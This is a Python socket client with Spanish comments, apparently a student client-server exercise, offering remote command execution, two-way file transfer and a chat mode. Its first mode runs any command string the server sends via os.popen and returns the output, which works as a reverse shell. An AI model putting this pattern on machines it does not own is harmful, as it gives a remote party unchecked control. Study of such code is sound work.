from socket import *
import  socket
from tkinter import filedialog
import os
from tkinter import *


#Declaracion de variables
root = Tk() 
root.withdraw()

while True:
        try:  #esto evita que se cierre el cliente si el server no esta online
            while True:
                try:
                    mi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    mi_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
                    ip="localhost"
                    puerto=8000
                    mi_socket.connect((ip, puerto))
                    print("Conectado")
                    break
                except:
                    print("Servidor muerto... esperando a que se levante")
            while True:
                orden=mi_socket.recv(1024) #aqui se recibe la orden

                #Se reciben los comados
                if orden=="1".encode():  #si la orden fu? la opcion 4 se ejecuta este codigo
                    try:
                        comando=mi_socket.recv(1024) #se recive el comando que queremos ejecutar
                        resultado=os.popen(comando.decode()) #se ejecuta el comando y se almacena el resultado en un archivo
                        g=resultado.readlines() #se meten todas las lineas del arhivo en una lista
                        packet=""
                        for v in g: #se concatenan todas las lineas de la lista en una string
                            packet=packet+v
                        packet=packet+"\a"
                        for t in packet: #luego enviamos cada caracter de esa string al server, regresa al server, a la funcion enviarcomando()
                            mi_socket.send(t.encode())
                    except:
                        mi_socket.send("comando incorrecto ")
                        mi_socket.send("\a")

                #Recibir-enviar archivos
                elif orden == "2".encode():
                    try:
                        #Se recibe el nombre del archivo
                        nameFile = mi_socket.recv(1024)
                        f = open(nameFile, "wb")
                        while True:
                            try:
                                # Recibir datos del cliente.
                                input_data = mi_socket.recv(1024)
                            except error:
                                print("Error de lectura.")
                                break
                            else:
                                if input_data:
                                    # Compatibilidad con Python 3.
                                    if isinstance(input_data, bytes):
                                        end = input_data[0] == 1
                                    else:
                                        end = input_data == chr(1)
                                    if not end:
                                        # Almacenar datos.
                                        f.write(input_data)
                                    else:
                                        break
                        print("El archivo se ha recibido correctamente.")
                        #f.close()
                        archivo = filedialog.askopenfile(title="Abrir", initialdir= "C:/", filetypes=(("Todos los archivos", "*.*"),("Archivos de texto", "*.txt"),("Archivos pdf", "*.pdf") ))
                        #Se obiene le nombre del archivo y se envia 
                        nameFile = os.path.basename(archivo.name)
                        mi_socket.send(nameFile.encode())
                        while True:
                            f = open(archivo.name, "rb")
                            content = f.read(1024)
                            while content:
                                # Enviar contenido.
                                mi_socket.send(content)
                                content = f.read(1024)
                            break
                        # Se utiliza el caracter de código 1 para indicar al cliente que ya se ha enviado todo el contenido.
                        try:
                            mi_socket.send(chr(1))
                        except TypeError:
                            # Compatibilidad con Python 3.
                            mi_socket.send(bytes(chr(1), "utf-8"))
                        
                        # Cerrar conexión y archivo.
                        f.close()
                        print("El archivo se envio correctamente\n")
                       
                    except:
                        print("Servidor se desconecto\n")

                #Chat                
                elif orden == "3".encode():
                    try:
                        print("------------ CHAT ------------")
                        while True:
                            #Entrada para el mensaje
                            mensaje = input("Escribe tu mensaje: ",)
                            if (mensaje != "adios"):
                                mi_socket.send(mensaje.encode())
                                #Se recibe el mensaje del servidor
                                respuesta = mi_socket.recv(4096).decode()
                                print("Servidor: ",respuesta)
                            else:
                                 #Se envia mensaje al Servidor
                                mi_socket.send(mensaje.encode())
                                break
                    except:
                        mi_socket.send("Algo salio mal ")
                        mi_socket.send("\a")
        except:
            print ("servidor muerto...Esperando a que se levante")
            break








